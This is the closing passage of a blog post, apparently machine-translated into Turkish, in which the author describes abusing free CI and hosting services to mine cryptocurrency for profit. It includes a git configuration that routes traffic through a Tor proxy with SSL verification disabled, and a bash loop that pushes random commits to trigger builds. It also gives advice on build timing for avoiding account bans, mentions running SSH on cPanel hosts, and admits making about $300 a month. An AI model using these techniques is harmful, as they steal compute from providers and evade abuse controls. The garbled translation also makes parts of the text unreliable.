href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> liman işçisi-hub</a> . Travis standart CI gibidir ve çok esnektir, Semaphore tek<code>DSL</code> için<code>CI</code> bu, diğer UI'ler gibi yalnızca sonsuz bir spagetti onay kutusu dizisi yerine ulaşılabilir ve iyi görünüyordu ve Docker yalnızca docker dosyalarını yapılara eşleme kolaylığı için.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Yapılandırmaları oluşturur</a></h3><p>Yapılar, web servisleri tarafından sunulan cron işleri veya git taahhütleri tarafından tetiklendi. Bu nedenle, tüm git taahhütlerini yönetmek için bir dizi erişim belirteci veya ssh anahtarının izini sürmeniz gerekiyordu. Ayrıca, aşırı spam taahhütleri yapmamak ve git'i yapılandıran depolara gönderirken proxy'leri kullanmak da önemliydi:<pre><code class="toml hljs"><span class=hljs-section>[http]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[https]</span><span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span><span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span><span class=hljs-section>[url "https://"]</span><span class=hljs-attr>insteadOf</span> = git://</code></pre><p>Git barındırma hizmetlerini kullanan github, yasaklar konusunda daha kapsamlı olanlardan biriydi, ancak bunlar yalnızca ci hizmetleri yöneticileri tarafından kötüye kullanım raporları üzerine uygulandı, gitlab bir kez CI denemesini yenilemeye çalıştığımda (dikkatsizce) bir yasak dalgası yürüttü. Bir bitbucket hesabı için hiç ban almadım. Git taahhütlerini zorlamak (zorlamak) için, git deposunu yeniden etiketleyen uzun bir çalışan döngümüz var:<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(ls -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span><span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span><span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        sleep <span class=hljs-variable>$repos_ival</span><span class=hljs-keyword>done</span>
    sleep 1
<span class=hljs-keyword>done</span></code></pre><p>Bu şekilde zorlamanın github'ın pek sevmediği ve hesapların işaretlenmesine neden olmuş olabilir. Farklı taahhütleri zorlamakla görevlendirilen etiketleyici işlevi, bazı rastgele taahhütler veren bir web sitesi (kolayca arayabileceğiniz) kullanır. Bunun ne kadar yardımcı olduğundan emin değilim, çünkü taahhütlerin içeriği benim durumum için açıkça şüpheli. Ayrıca bir keresinde beni kıçımdan ısırdı, çünkü bu komut tarafından döndürülen taahhütler küfür kelimeleri içerebileceğinden, taahhütlerimden biri git taahhütlerini küfürlü kelimelerle izleyen bir twitter botu tarafından alındı! Olaydan sonra kötü sözler için kara liste ekledim.<p>Gizlenmiş git taahhütlerine ve gizlenmiş git depolarına gerçekten girmedim. Daha ayrıntılı bir depo kullandığım tek örnek, sistem bir ortamı tanımıyorsa (mobil uygulamalar gibi) bir yapı kuramayacağınız için Bitrise ile oldu, ancak o zaman bile herhangi bir döndürme yoktu ve her zaman aynıydı. depo, tespit etmek oldukça kolay.<p>Genel olarak, benim için en uygun zaman etrafında bir çan eğrisi çizmem gerekirse<em> olmadan</em>Test edilen tüm hizmetlerde hesapların yasaklanması, günde bir kez yaklaşık 1 saatlik oluşturma süresine sahip bir merkezde olacaktır. İşlemci çekirdekleri için, birkaç yalancı (drone gibi) dışında, çoğu hizmet, derlemeler sanal makineler veya sınırlı kaynaklara sahip kapsayıcılar içinde çalıştırıldığından size verilen kaynakların tamamını kullanmanızı bekler... ve derleme genellikle bir görevdir. işlemciyi doyurur, bu nedenle istatistiksel bir ilgisi yoktur. Sezgisel olarak, ortalama bir geliştiricinin yapacağı şey günde bir derlemedir, bu nedenle ortalamadan uzaklaşırsanız yükseltilmiş bayraklar beklemelisiniz ve kötüye kullanım için zorlama asla iyi bitmez.<h2 id=conclusions><a class=header-anchor href=#conclusions> Sonuçlar</a></h2><p>Buna değdi? Ağ oluşturma bölümleri kesinlikle ilginçti, hesap kayıtlarıyla uğraşmak açıkçası en kötü bölümdü, sonuçta hiç kimse sonsuz onay e-postalarına tıklamayı ve zihin uyuşturan UI prosedürlerini tekrarlamayı sevmez. İstenmeyen posta otomasyon yazılımı yazmak da sıkıcı (çünkü çoğunlukla aptal API'leri kurcalıyorsunuz) ve bu varsayımla (ve bunun asla ciddi bir şey olmadığı gerçeği) hiç düşünmedim bile. Kârlı mıydı? Zirvede şöyle bir şeye ulaşıyordu<code>300$</code> ayda, belki bir venezüellalı için yeterli, pek bana göre değil :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> huysuz sistem yöneticisi</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>Bu, birçok gizlilik varsayımını kıracak olsa da, eminim ki çoğu, yerleşik bir sorun olduğunda yalnızca içeriye bakar, ancak bu yalnızca kapsayıcı tabanlı çalışma zamanları için bir sorundur, oysa VM'ler hemen hemen kara kutulardır.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>monero düğümüne yerleşik madenci, onu daha arka plan dostu hale getirmek için bazı çalışmalar yaptı, ancak xmrig dağıtımı hiçbir zaman arka plan dostu olmaya odaklanmadı.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>bazı havuzlar farklı bağlantı portlarında farklı zorluklar sunar ve iş zorluğunu madenci tarafından gönderilen paylaşımlara göre ayarlama eğilimindedir, ancak proxy'nin ayrıntı düzeyi, havuzu önleyeceği için hala daha uygundur.<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> içeri kilitlemek</a> (asla havuzları gerçekten değiştirmememize rağmen).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>yapılandırma aniden belirip dosya sisteminden kaybolduğunda mutlu değildi</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>hakkında konuşmuyoruz<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> katman protokolü</a> sadece uygulanan her şeyle uğraşmak zorunda olduğumuz için<em> ikisi birden</em> havuz ve madenci... ki bu genellikle minimumdur ve muhtemelen standart olmayan uzantılara sahiptir.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>asla tam bash gitme :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Çekirdek, yürütülebilir dosyanın bellek düzenindeki adresi arayacak ve bu da dosya sistemine erişecek ve muhtemelen bir çökmeye neden olacağından, bir işlem çalışma zamanında ek işlevler yüklediğinde ne olduğunu araştırmadım.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Sınırlar isteğe bağlıdır, işlemci süresi bir saniyeden azdır, bellek 128M'den azdır, giden bağlantılar engellenir.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>biraz sabırla, cpanel hesap alanınız etrafında önyüklenen bir ortam üzerinde tam bir ssh örneği de çalıştırabilirsiniz,<em> olmadan</em> barındırma sağlayıcıları tarafından devre dışı bırakılma eğiliminde olan cpanel yerleşik SSH'sine erişime sahip olmak.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift 1 yıllık ücretsiz kullanımdan 3 aydan 1 aya çıktı, telefonla kimlik doğrulama gerektirmeye başladı, hizmetlerini kötüye kullanan tek kişi olmadığımı garanti edebilirim.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Heroku ücretsiz katman kapsayıcıları kaynaklar açısından oldukça cömerttir, 4c/8t (sanal) işlemci, bol miktarda ram ve büyük depolama sağlarlar (ancak bunlar kalıcı değildir ve dyno kapatma sırasında atılır).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Daha sıkı kayıt kuralları ekliyorlar, birkaç yasaktan sonra buna katkıda bulunmuş olabilirim.</table><p><div class=page-foot><div class=copyright></div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Destekleyen<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/tr/sitemapxml> Site Haritası</a></li> | <li><a href=/tr/tag> Etiketler</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>